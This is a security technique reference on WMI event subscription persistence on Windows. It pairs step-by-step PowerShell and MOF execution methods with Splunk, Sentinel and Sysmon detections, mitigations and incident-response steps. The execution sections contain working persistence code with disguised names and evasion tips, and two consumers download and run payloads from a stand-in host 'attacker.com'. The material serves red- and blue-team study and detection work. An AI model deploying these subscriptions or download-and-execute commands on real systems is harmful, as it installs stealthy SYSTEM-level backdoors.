# [REALWORLD-028]: WMI Event Subscriber Persistence

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-028 |
| **MITRE ATT&CK v18.1** | [T1546.003 - Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10, 11 |
| **Patched In** | N/A (Design feature; mitigations available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** WMI Event Subscriptions allow code execution when specific Windows Management Instrumentation events occur, enabling stealthy persistence with SYSTEM-level privileges. Attackers create three components: an **__EventFilter** (trigger condition), an **__EventConsumer** (action to execute), and an **__FilterToConsumerBinding** (linking filter to consumer). Once registered, the WMI Provider Host process (WmiPrvSe.exe) executes the consumer whenever the filter condition is met (e.g., process creation, logon, time interval). This technique is extremely difficult to detect because the binding is stored in the WMI database and executed by a trusted system process with elevated privileges.

**Attack Surface:** WMI namespaces (`root\subscription`, `root\default`), WMI classes (`__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding`), and PowerShell WMI cmdlets.

**Business Impact:** **Persistent SYSTEM-Level Code Execution.** WMI event subscriptions execute with SYSTEM privileges regardless of the initiating user context. An attacker can establish a backdoor that persists through account lockdowns, credential changes, and even reimaging (if WMI database backup is restored). This is a favorite technique of sophisticated APT groups for establishing long-term persistence.

**Technical Context:** WMI subscription setup takes seconds to minutes. Detection likelihood is low unless WMI events (Sysmon 19/20/21) are being logged. Persistence is indefinite; WMI subscriptions survive OS updates and account changes.

### Operational Risk

- **Execution Risk:** High (Requires SYSTEM or admin; modifying WMI database is permanent and hard to reverse)
- **Stealth:** Very High (WMI subscriptions do not appear in Task Scheduler, Registry Run keys, or standard persistence locations; they are stored in WMI database)
- **Reversibility:** Difficult (Requires direct WMI database manipulation or MOF decompilation to remove)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022 8.4.2 | Disable WMI Service unless absolutely necessary |
| **DISA STIG** | WN10-CC-000125 | WMI must be restricted to prevent unauthorized code execution |
| **NIST 800-53** | AC-6 (Least Privilege) | Restrict WMI access to authorized administrators only |
| **GDPR** | Article 32 | Security of processing; cryptographic controls |
| **DORA** | Article 9 | Protection measures; incident response |
| **NIS2** | Article 21 | Detection and response capabilities |
| **ISO 27001** | A.13.2.1 (Segregation of Networks) | Isolation of critical processes like WMI |
| **ISO 27005** | Risk Scenario: "Unauthorized WMI Subscription Creation" | Compromise of WMI database enabling persistent code execution |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** SYSTEM, Local Administrator, or membership in the Performance Log Users group (with additional WMI namespace permissions)
- **Required Access:** Local system access or WMI namespace access (root\subscription)
- **Supported Versions:**
  - **Windows:** Server 2016, 2019, 2022, 2025; Windows 10, 11
  - **PowerShell:** Version 5.0+ (for CIM cmdlets)
  - **WMI:** Built-in; WmiPrvSe.exe service
  - **Other Requirements:** WMI service running (default); WMI database writable

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Enumerate Existing WMI Event Subscriptions

**Objective:** Discover existing WMI subscriptions to identify any pre-existing persistence.

**Command (List All Subscriptions):**

```powershell
# Connect to WMI namespace
$Namespace = "root\subscription"

# Get all event filters
Get-WmiObject -Namespace $Namespace -Class __EventFilter | `
    Select-Object Name, EventNamespace, Query

# Get all event consumers
Get-WmiObject -Namespace $Namespace -Class __EventConsumer | `
    Select-Object Name, CommandLineTemplate

# Get all filter-to-consumer bindings
Get-WmiObject -Namespace $Namespace -Class __FilterToConsumerBinding | `
    Select-Object Filter, Consumer
```

**What to Look For:**

- Event filters with suspicious query syntax (not typical Microsoft monitoring queries)
- CommandLineTemplate containing PowerShell, cmd.exe, or script execution
- Filters triggering on process creation (__InstanceCreationEvent)
- Consumers with encoded commands or references to temp directories
- Bindings created recently (check **CreatedTime** properties)

**Version Note:** Syntax consistent across Server 2016-2025.

#### Check WMI Namespace Permissions

**Objective:** Verify who has write access to the WMI subscription namespace.

**Command:**

```powershell
# Get DCOM permissions for WMI
$DCOM = Get-WmiObject -Namespace "root\cimv2" -Class __COMClassSecurityDescriptor -Filter "Name='WbemLocator'"
$DCOM | Select-Object -ExpandProperty Descriptor

# Get namespace-level ACL
Get-WmiObject -Namespace "root\subscription" | Get-Acl
```

**What to Look For:**

- High-privilege groups (Administrators, Authenticated Users) with write permissions
- Non-standard users or service accounts with WMI write access
- DCOM launch/access permissions set to low levels

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Create WMI Event Subscription Using PowerShell CIM Cmdlets

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Create Event Filter

**Objective:** Define the trigger condition for the WMI subscription (e.g., process creation, logon event).

**Command (PowerShell, as Administrator):**

```powershell
# Define the WMI event filter
# Trigger: Every time a process is created
$FilterParams = @{
    'Name' = 'UpdateCheckFilter'  # Legitimate-sounding name
    'EventNamespace' = 'root\cimv2'
    'QueryLanguage' = 'WQL'
    'Query' = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
}

# Create the filter in WMI namespace root\subscription
$Filter = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments $FilterParams
Write-Host "Event Filter created: $($Filter.Name)"
```

**Expected Output:**

```
Event Filter created: UpdateCheckFilter
```

**What This Means:**

- An event filter named "UpdateCheckFilter" has been created
- Filter triggers on **__InstanceCreationEvent** (every new process creation)
- Filter exists in `root\subscription` namespace
- Filter is now waiting for matching events

#### Step 2: Create Event Consumer

**Objective:** Define the action to execute when the filter is triggered.

**Command (PowerShell):**

```powershell
# Define the WMI event consumer (action)
# This consumer will execute a malicious command whenever the filter matches
$ConsumerParams = @{
    'Name' = 'UpdateCheckConsumer'  # Legitimate-sounding name
    'CommandLineTemplate' = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\beacon.ps1'
    'ExecutablePath' = 'C:\Windows\System32\cmd.exe'  # Can specify CMD or powershell
    'ParentProcessPath' = 'C:\Windows\System32\svchost.exe'  # Hide under svchost context
}

# Create the consumer
$Consumer = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments $ConsumerParams
Write-Host "Event Consumer created: $($Consumer.Name)"
```

**Expected Output:**

```
Event Consumer created: UpdateCheckConsumer
```

**What This Means:**

- An event consumer named "UpdateCheckConsumer" has been created
- Consumer executes PowerShell with the beacon.ps1 payload
- Consumer runs in system context via svchost.exe (stealthy)
- Consumer is now waiting to be bound to a filter

**OpSec & Evasion:**

- Legitimate-sounding names ("UpdateCheck", "WindowsUpdate") evade manual inspection
- PowerShell execution via cmd.exe wrapper bypasses direct PowerShell monitoring
- Hidden window style prevents visible command prompt
- WMI execution proxied through WmiPrvSe.exe (trusted process)
- Detection likelihood: Low (unless Sysmon 20 is enabled and monitored)

#### Step 3: Create Filter-to-Consumer Binding

**Objective:** Link the event filter to the consumer, activating the subscription.

**Command (PowerShell):**

```powershell
# Create the binding between filter and consumer
$BindingParams = @{
    'Filter' = [Ref]$Filter  # Reference to the filter created in Step 1
    'Consumer' = [Ref]$Consumer  # Reference to the consumer created in Step 2
}

# Register the binding
$Binding = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments $BindingParams
Write-Host "Filter-Consumer binding created: Binding established between $($Filter.Name) and $($Consumer.Name)"

# Verify the subscription is active
Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' | Select-Object Filter, Consumer
```

**Expected Output:**

```
Filter-Consumer binding created: Binding established between UpdateCheckFilter and UpdateCheckConsumer

Filter                          Consumer
------                          --------
\\.\root\subscription:__EventFilter... \\.\root\subscription:CommandLineEventConsumer...
```

**What This Means:**

- The filter and consumer are now linked
- WMI subscription is **active and persistent**
- Whenever a new process is created (filter condition), PowerShell beacon.ps1 will execute
- The binding persists through reboots and system updates
- WmiPrvSe.exe will proxy execution with SYSTEM privileges

#### Step 4: Verify Subscription Persistence

**Objective:** Confirm the WMI subscription is active and will persist.

**Command:**

```powershell
# List all active subscriptions
Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' | `
    ForEach-Object {
        $Filter = Get-WmiObject -Namespace 'root\subscription' -Filter "Name='$($_.Filter.Split('"')[1])'" -Class '__EventFilter'
        $Consumer = Get-WmiObject -Namespace 'root\subscription' -Filter "Name='$($_.Consumer.Split('"')[1])'" -Class 'CommandLineEventConsumer'
        Write-Host "Subscription: $($Filter.Name) → $($Consumer.Name)"
        Write-Host "  Trigger: $($Filter.Query)"
        Write-Host "  Action: $($Consumer.CommandLineTemplate)"
        Write-Host "  ---"
    }
```

**Expected Output:**

```
Subscription: UpdateCheckFilter → UpdateCheckConsumer
  Trigger: SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'
  Action: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\beacon.ps1
  ---
```

---

### METHOD 2: Create WMI Subscription via MOF File and Compilation

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Create MOF (Managed Object Format) File

**Objective:** Define WMI subscription in MOF format for compilation into WMI database.

**Command (Create C:\Temp\malicious.mof):**

```mof
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
  Name = "WindowsUpdateFilter";
  EventNamespace = "root\\cimv2";
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=2";
  QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as $Consumer
{
  Name = "WindowsUpdateConsumer";
  CommandLineTemplate = "powershell.exe -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/beacon.ps1')";
  ExecutablePath = "C:\\Windows\\System32\\cmd.exe";
};

instance of __FilterToConsumerBinding
{
  Consumer = $Consumer;
  Filter = $EventFilter;
};
```

**What This Means:**

- MOF file defines filter (triggers at 2 AM daily)
- Consumer downloads and executes PowerShell beacon from remote server
- Binding links filter to consumer
- MOF format compiles into WMI database permanently

#### Step 2: Compile MOF File into WMI Database

**Objective:** Compile the MOF file to register the WMI subscription permanently.

**Command (PowerShell, as Administrator):**

```powershell
# Compile the MOF file
$MofPath = "C:\Temp\malicious.mof"
mofcomp.exe $MofPath

# Verify compilation success
if ($LASTEXITCODE -eq 0) {
    Write-Host "MOF compiled successfully; WMI subscription registered"
} else {
    Write-Host "MOF compilation failed with error code: $LASTEXITCODE"
}

# Verify subscription is registered
Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding'
```

**Expected Output:**

```
MOF compiled successfully; WMI subscription registered
(FilterToConsumerBinding objects listed)
```

**What This Means:**

- MOF file has been compiled and merged into WMI database
- WMI subscription is now permanent and persistent
- Triggering event (2 AM daily) will execute the PowerShell beacon
- WmiPrvSe.exe will execute with SYSTEM privileges

**OpSec & Evasion:**

- MOF compilation is legitimate administrative activity
- mofcomp.exe is a built-in Windows utility
- No obvious malicious artifacts in command line
- WMI subscription is hidden from Task Scheduler and Registry Run keys
- Detection likelihood: Medium (mofcomp.exe with non-standard MOF files may trigger alerts)

---

### METHOD 3: Create WMI Subscription Persisting on System Startup

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Create Event Filter Triggered on System Boot

**Objective:** Create a filter that triggers when the system starts up.

**Command (PowerShell):**

```powershell
# Create filter: Trigger when system boots
$BootFilterParams = @{
    'Name' = 'SystemBootNotification'
    'EventNamespace' = 'root\cimv2'
    'QueryLanguage' = 'WQL'
    'Query' = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemBootTime != null"
}

$BootFilter = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments $BootFilterParams
Write-Host "Boot filter created: $($BootFilter.Name)"
```

**Expected Output:**

```
Boot filter created: SystemBootNotification
```

**What This Means:**

- Filter triggers whenever Win32_PerfRawData_PerfOS_System reports a boot event
- This happens once per system startup
- Persistence mechanism ensures payload executes after every reboot

#### Step 2: Create Consumer Downloading Payload at Boot

**Objective:** Consumer executes when boot filter triggers; downloads and runs payload.

**Command (PowerShell):**

```powershell
# Create consumer: Download and execute beacon at boot
$BootConsumerParams = @{
    'Name' = 'SystemBootConsumer'
    'CommandLineTemplate' = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { (New-Object System.Net.WebClient).DownloadFile(''https://attacker.com/payload.exe'', ''C:\Windows\Temp\svc_host.exe''); & ''C:\Windows\Temp\svc_host.exe'' }"'
}

$BootConsumer = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments $BootConsumerParams
Write-Host "Boot consumer created: $($BootConsumer.Name)"
```

#### Step 3: Bind Boot Filter to Consumer

**Objective:** Link the boot trigger to the payload execution.

**Command (PowerShell):**

```powershell
# Create binding
$BootBindingParams = @{
    'Filter' = [Ref]$BootFilter
    'Consumer' = [Ref]$BootConsumer
}

$BootBinding = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments $BootBindingParams
Write-Host "Boot persistence activated; payload will execute on system startup"
```

**Expected Output:**

```
Boot persistence activated; payload will execute on system startup
```

**What This Means:**

- System will download and execute the payload (`payload.exe`) every time it boots
- Execution occurs with SYSTEM privileges via WmiPrvSe.exe
- No user interaction required; payload runs automatically at boot
- This is a powerful persistence mechanism for ransomware, backdoors, or spyware

---

## 6. SPLUNK DETECTION RULES

### Rule 1: WMI Event Subscription Creation

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `WinEventLog:Security` or `sysmon`
- **Required Fields:** `EventID`, `Provider`, `QueryLanguage`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016-2025, Windows 10/11

**SPL Query:**

```spl
index=main sourcetype=sysmon EventID=20 OR EventID=19 OR EventID=21
| stats count by host, User, Image, CommandLine
| where count > 0
```

**Alternative Query (Windows Security Event Log):**

```spl
index=main sourcetype="WinEventLog:Security"
(CommandLine="*Set-WmiInstance*" OR CommandLine="*__EventFilter*" OR CommandLine="*CommandLineEventConsumer*")
| stats count by host, User, CommandLine
```

**What This Detects:**

- Sysmon Event ID 19: WMI Event Filter creation
- Sysmon Event ID 20: WMI Event Consumer creation
- Sysmon Event ID 21: Filter-to-Consumer Binding creation
- PowerShell commands creating WMI subscriptions

**Manual Configuration Steps:**

1. Log into Splunk → **Search & Reporting** → **New Alert**
2. Paste the SPL query
3. Set **Trigger Condition** to: `count > 0`
4. Configure **Action** → **Send Email**
5. Set **Schedule** to run every 5 minutes
6. Click **Save**

---

### Rule 2: Suspicious WMI Consumer Command Execution

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `sysmon`
- **Required Fields:** `EventID`, `ParentImage`, `CommandLine`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016+

**SPL Query:**

```spl
index=main sourcetype=sysmon EventID=1 ParentImage="*WmiPrvSe.exe"
(CommandLine="*powershell*" OR CommandLine="*cmd.exe*" OR CommandLine="*wmic*")
| stats count by host, User, CommandLine, ParentImage
| where count > 0
```

**What This Detects:**

- Process creation (EventID 1) where parent is WmiPrvSe.exe
- PowerShell, cmd.exe, or wmic spawned by WMI Provider Host
- Indicates WMI consumer executing malicious command

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: WMI Event Subscription Creation via PowerShell

**Rule Configuration:**

- **Required Table:** `SecurityEvent` or `DeviceProcessEvents`
- **Required Fields:** `EventID`, `CommandLine`, `ProcessName`
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Windows versions with Defender for Endpoint

**KQL Query:**

```kusto
DeviceProcessEvents
| where ProcessCommandLine contains "Set-WmiInstance" 
    and (ProcessCommandLine contains "__EventFilter" or ProcessCommandLine contains "CommandLineEventConsumer")
| project TimeGenerated, DeviceName, AccountName, ProcessName, ProcessCommandLine
| summarize count() by DeviceName, AccountName, ProcessCommandLine
| where count > 0
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `WMI Event Subscription Creation Detected`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create** → **Create**

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: Not Standard (Requires Sysmon)**

- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Sysmon Event ID 19:** WMI Event Filter creation
- **Sysmon Event ID 20:** WMI Event Consumer creation
- **Sysmon Event ID 21:** Filter-to-Consumer Binding creation
- **Applies To Versions:** Requires Sysmon 6.0.4+

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security
- **Trigger:** `mofcomp.exe` executed or PowerShell with WMI cmdlets
- **Filter:** `CommandLine contains "mofcomp" OR CommandLine contains "Set-WmiInstance"`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Install Sysmon):**

1. Download Sysmon: [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create sysmon-config.xml with:
   ```xml
   <Sysmon schemaversion="4.81">
     <EventFiltering>
       <WmiEvent onmatch="include"/>
     </EventFiltering>
   </Sysmon>
   ```
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 6.0.4+

**Sysmon Config Snippet:**

```xml
<!-- Detect WMI Event Subscription Creation -->
<RuleGroup name="WMI Event" groupRelation="or">
  <WmiEvent onmatch="include">
    <Operation condition="is">Created</Operation>
  </WmiEvent>
  <WmiEvent onmatch="include">
    <Destination condition="contains">CommandLineEventConsumer</Destination>
  </WmiEvent>
</RuleGroup>

<!-- Detect MOF Compilation -->
<RuleGroup name="Process Creation" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="ends with">mofcomp.exe</Image>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -Filter "*WmiEvent*"`

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Restrict WMI Namespace Access:** Limit who can create objects in `root\subscription` namespace.

    **Manual Steps (WMI Namespace ACL):**
    1. Open **wmimgmt.msc** (WMI Control)
    2. Right-click **WMI Control (Local)** → **Properties**
    3. Click **Security** tab
    4. Click **Security** button
    5. Select **root\subscription** namespace
    6. Click **Security** → Edit
    7. Remove write/create permissions for all except Administrators
    8. Click **Apply** → **OK**

    **Manual Steps (PowerShell):**
    ```powershell
    # Get current namespace ACL
    Get-WmiObject -Namespace "root\subscription" | Get-Acl

    # Restrict to Administrators only (advanced approach requires WMI ACL tool)
    ```

*   **Disable WMI Service (If Not Required):** Stop and disable the Windows Management Instrumentation service if not needed.

    **Manual Steps:**
    1. Open **services.msc**
    2. Find **Windows Management Instrumentation**
    3. Right-click → **Properties**
    4. Set **Startup type** to **Disabled**
    5. Click **Stop**
    6. Click **Apply** → **OK**

    **Manual Steps (PowerShell):**
    ```powershell
    Stop-Service -Name "WinMgmt" -Force
    Set-Service -Name "WinMgmt" -StartupType Disabled
    ```

*   **Block MOF File Compilation:** Prevent mofcomp.exe execution via AppLocker or WDAC.

    **Manual Steps (AppLocker):**
    1. Open **Local Security Policy** (gpedit.msc)
    2. Navigate to **Computer Configuration** → **Windows Settings** → **Application Control Policies** → **AppLocker** → **Executable Rules**
    3. Create rule to block: `C:\Windows\System32\mofcomp.exe`
    4. Set rule action to **Deny**
    5. Apply and test

### Priority 2: HIGH

*   **Enable WMI Audit Logging:** Monitor WMI activity via Sysmon or Windows Event Log.

    **Manual Steps (Enable Sysmon WMI Logging):**
    1. Install Sysmon with WMI event logging enabled (see Sysmon section above)
    2. Configure forwarding of Sysmon logs to SIEM/logging system

*   **Implement Behavioral Monitoring:** Monitor for WmiPrvSe.exe spawning suspicious child processes.

    **Manual Steps (Using Splunk):**
    ```spl
    index=main ParentImage="*WmiPrvSe.exe" 
    | stats count by host, CommandLine
    | where count > 0
    ```

### Priority 3: MEDIUM

*   **Restrict PowerShell Access:** Limit who can execute PowerShell scripts via Constrained Language Mode.

    **Manual Steps (PowerShell Execution Policy):**
    ```powershell
    Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine -Force
    ```

    **Manual Steps (AppLocker for PowerShell):**
    1. Create AppLocker rule to block unsigned PowerShell scripts
    2. Allow only administrator-signed scripts
    3. Deploy via Group Policy

### Validation Command (Verify Fix)

```powershell
# Check WMI namespace ACL
Get-WmiObject -Namespace "root\subscription" | Get-Acl

# Verify WMI service is disabled
Get-Service -Name "WinMgmt" | Select-Object Name, StartupType, Status

# Verify AppLocker rules for mofcomp.exe
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Verify no WMI subscriptions exist
Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding'
```

**Expected Output (If Secure):**

- WMI namespace ACL shows only Administrators have full control
- WinMgmt service status shows `Stopped` and StartupType shows `Disabled`
- AppLocker rules include block for mofcomp.exe
- No __FilterToConsumerBinding objects returned (clean system)

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Process Artifacts:**
    - `mofcomp.exe` execution
    - `powershell.exe` with `Set-WmiInstance` cmdlet
    - `wbemtest.exe` or `wmimgmt.msc` used to create subscriptions

*   **WMI Database Artifacts:**
    - New entries in `root\subscription` namespace (__EventFilter, __EventConsumer, __FilterToConsumerBinding)
    - Suspicious filter queries or command templates
    - Recent CreatedTime/ModifiedTime timestamps

*   **File Artifacts:**
    - .MOF files in temp directories (`C:\Temp\*.mof`, `%TEMP%\*.mof`)
    - PowerShell scripts referenced by WMI consumers

### Forensic Artifacts

*   **Disk:**
    - Security Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (EventID 4688)
    - Sysmon logs: `C:\ProgramData\Sysmon\` (WMI events 19/20/21)
    - WMI repository: `C:\Windows\System32\wbem\Repository\` (binary WMI database)

*   **Memory:**
    - WmiPrvSe.exe process memory contains WMI object definitions
    - WMI consumer command execution will appear in process memory

*   **Cloud:**
    - Not applicable (on-premises only)

### Response Procedures

1.  **Isolate:**
    **Command:**
    ```powershell
    # Stop WMI service immediately
    Stop-Service -Name "WinMgmt" -Force

    # List all WMI subscriptions (before stopping service)
    Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' > C:\Evidence\WMI_Subscriptions.txt
    ```

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export WMI repository
    Copy-Item "C:\Windows\System32\wbem\Repository" -Destination "C:\Evidence\WMI_Repository" -Recurse

    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx

    # Export Sysmon logs if available
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # List and remove WMI subscriptions
    Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' | Remove-WmiObject -Confirm:$false

    Get-WmiObject -Namespace 'root\subscription' -Class '__EventConsumer' | Remove-WmiObject -Confirm:$false

    Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' | Remove-WmiObject -Confirm:$false

    # Restart WMI service
    Start-Service -Name "WinMgmt"

    # Verify no subscriptions remain
    Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding'
    ```

4.  **Investigate:**
    - Examine WMI database for creation timestamps
    - Correlate with Security Event Log for user who created subscriptions
    - Check for lateral movement or data exfiltration triggered by WMI consumers
    - Review any downloaded payloads referenced in CommandLineTemplate

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker gains initial access via internal email phishing |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Attacker escalates to System/Admin on endpoint |
| **3** | **Persistence - Current Step** | **[REALWORLD-028] WMI Event Subscriber Persistence** | **Attacker creates WMI subscriptions for persistent SYSTEM-level code execution** |
| **4** | **Collection** | [REALWORLD-030] Registry Credential Dumping | Attacker dumps credentials from registry via WMI consumer execution |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses stolen hashes to move laterally |
| **6** | **Impact** | [REALWORLD-040] Ransomware via WMI Event | Attacker deploys ransomware through WMI event execution |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - SolarWinds Compromise

- **Target:** US Government, NATO allies
- **Timeline:** 2020-2021
- **Technique Status:** APT29 used WMI event subscriptions in conjunction with other persistence mechanisms to maintain long-term access during the SolarWinds supply-chain compromise
- **Impact:** Compromise of multiple federal agencies; hundreds of organizations affected
- **Reference:** [CISA Advisory on SolarWinds/APT29](https://www.cisa.gov/news-events/alerts/2020/12/13/alert-aa20-352a-advanced-persistent-threat-compromise-federal-networks)

### Example 2: Blue Mockingbird APT

- **Target:** Aviation sector, manufacturing
- **Timeline:** 2019-2021
- **Technique Status:** Blue Mockingbird used mofcomp.exe to compile MOF files creating WMI event subscriptions for persistence and code execution
- **Impact:** Compromise of critical infrastructure; malware distribution
- **Reference:** [Red Canary Blog on Blue Mockingbird](https://redcanary.com/blog/blue-mockingbird/)

---
